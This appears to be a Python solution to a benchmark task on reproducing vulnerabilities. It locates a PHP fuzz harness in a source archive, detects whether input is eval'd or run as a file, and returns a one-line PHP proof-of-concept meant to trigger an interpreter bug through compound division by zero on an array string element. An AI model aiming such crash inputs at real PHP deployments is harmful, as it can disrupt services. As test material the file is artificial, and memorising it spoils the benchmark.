import os
import tarfile
from typing import Optional, Tuple


class Solution:
    def _read_member_prefix(self, tar: tarfile.TarFile, member: tarfile.TarInfo, limit: int = 256_000) -> bytes:
        try:
            f = tar.extractfile(member)
            if f is None:
                return b""
            with f:
                return f.read(limit)
        except Exception:
            return b""

    def _find_fuzzer_source_in_tar(self, src_path: str) -> Optional[Tuple[str, bytes]]:
        try:
            with tarfile.open(src_path, "r:*") as tar:
                candidates = []
                for m in tar:
                    if not m.isfile():
                        continue
                    n = m.name.lower()
                    base = os.path.basename(n)
                    if not (base.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp"))):
                        continue
                    if any(k in n for k in ("fuzz", "fuzzer", "oss-fuzz", "libfuzzer")):
                        candidates.append(m)
                        if len(candidates) >= 200:
                            break

                # First pass: likely fuzzer files
                for m in candidates:
                    data = self._read_member_prefix(tar, m)
                    if b"LLVMFuzzerTestOneInput" in data or b"HF_ITER" in data:
                        return m.name, data

            # Second pass: broader search, but limited
            with tarfile.open(src_path, "r:*") as tar:
                checked = 0
                for m in tar:
                    if checked >= 400:
                        break
                    if not m.isfile():
                        continue
                    n = m.name.lower()
                    base = os.path.basename(n)
                    if not base.endswith((".c", ".cc", ".cpp", ".cxx")):
                        continue
                    checked += 1
                    data = self._read_member_prefix(tar, m)
                    if b"LLVMFuzzerTestOneInput" in data:
                        return m.name, data
        except Exception:
            return None
        return None

    def _find_fuzzer_source_in_dir(self, src_dir: str) -> Optional[Tuple[str, bytes]]:
        candidates = []
        for root, _, files in os.walk(src_dir):
            for fn in files:
                lfn = fn.lower()
                if not lfn.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp")):
                    continue
                p = os.path.join(root, fn)
                lp = p.lower()
                if any(k in lp for k in ("fuzz", "fuzzer", "oss-fuzz", "libfuzzer")):
                    candidates.append(p)
        candidates = candidates[:300]

        def read_prefix(path: str, limit: int = 256_000) -> bytes:
            try:
                with open(path, "rb") as f:
                    return f.read(limit)
            except Exception:
                return b""

        for p in candidates:
            data = read_prefix(p)
            if b"LLVMFuzzerTestOneInput" in data:
                return p, data

        checked = 0
        for root, _, files in os.walk(src_dir):
            for fn in files:
                if checked >= 400:
                    break
                lfn = fn.lower()
                if not lfn.endswith((".c", ".cc", ".cpp", ".cxx")):
                    continue
                checked += 1
                p = os.path.join(root, fn)
                data = read_prefix(p)
                if b"LLVMFuzzerTestOneInput" in data:
                    return p, data
        return None

    def _detect_php_mode(self, src_path: str) -> str:
        """
        Returns:
            'eval' : input should NOT include '<?php'
            'file' : input should include '<?php'
        Default to 'eval' because many fuzz harnesses use zend_eval_stringl/compile_string.
        """
        fuzzer = None
        if os.path.isdir(src_path):
            fuzzer = self._find_fuzzer_source_in_dir(src_path)
        else:
            fuzzer = self._find_fuzzer_source_in_tar(src_path)

        if fuzzer is None:
            # Heuristic by names: if looks like php-src, assume eval-based fuzzing
            lower = src_path.lower()
            if "php" in lower or "zend" in lower:
                return "eval"
            return "eval"

        _, data = fuzzer
        dlow = data.lower()

        # If harness explicitly prepends open tag, do not include it.
        if b"<?php" in dlow and (b"zend_eval_string" in dlow or b"zend_compile_string" in dlow or b"compile_string" in dlow):
            return "eval"

        if b"zend_eval_stringl" in dlow or b"zend_eval_string" in dlow or b"zend_compile_string" in dlow:
            return "eval"

        if b"php_execute_script" in dlow:
            return "file"

        return "eval"

    def solve(self, src_path: str) -> bytes:
        mode = self._detect_php_mode(src_path)

        # PHP PoC: dynamic (non-interned) string in array element, compound division by zero, catch to keep fixed version exit=0
        php_body = b'$a=[str_repeat("A",2)];try{$a[0]/=0;}catch(Error $e){}'

        if mode == "file":
            return b"<?php" + php_body
        return php_body